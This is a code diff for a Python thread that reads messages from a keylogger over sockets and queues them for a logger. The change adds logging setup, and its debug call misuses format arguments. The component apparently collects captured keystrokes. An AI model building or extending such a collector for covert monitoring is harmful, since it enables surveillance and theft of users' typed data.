@@ -11,22 +11,32 @@ import string
 import Queue
 import Logger
 
+# The Python logging module
+import logging
+
 class ClientHandler(threading.Thread):
-	'''
-	This is an active thread that is responsible for serving all
+	''' This is an active thread that is responsible for serving all
 	messages that come in from the keylogger. It simply strips
 	them out of the socket and forwards them along to the logger
 	actor via a message dictionary.
 	'''
 
 	def __init__(self, serv):
-		'''
-		Initialize the client handler with the parent server (TrafficProxy)
+		''' Initialize the client handler with the parent server (TrafficProxy)
 		'''
 		threading.Thread.__init__(self)
 		self.server = serv
 		self.clientList = []
 		self.running = True
+
+		# Setup the Python logger
+		self.lgr = logging.getLogger('abls')
+		self.lgr.setLevel(logging.DEBUG)
+		fh = logging.FileHandler('myapp.log')
+		fh.setLevel(logging.WARNING)
+		frmt = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+		fh.setFormatter(frmt)
+		self.lgr.addHandler(fh)
 
 		# Set the properties for this session.
 		self.logger = Logger.Logger()
@@ -34,13 +44,13 @@ class ClientHandler(threading.Thread):
 		self.logger.start()
 
 	def run(self):
-		'''
-		The main loop for this cliet handler thread. Simply strip messages
+		''' The main loop for this cliet handler thread. Simply strip messages
 		out of the socket and send them to the logger for processing.
 		'''
 		while self.running:
 			for client in self.clientList:
 				message = client.sock.recv(self.server.BUFFSIZE)
 				if message != None and message != "":
-					print("client message: ", message) # debug 
+					self.lgr.debug("client message: ", message)
+					#print("client message: ", message) # debug 
 					self.queue.put(message)
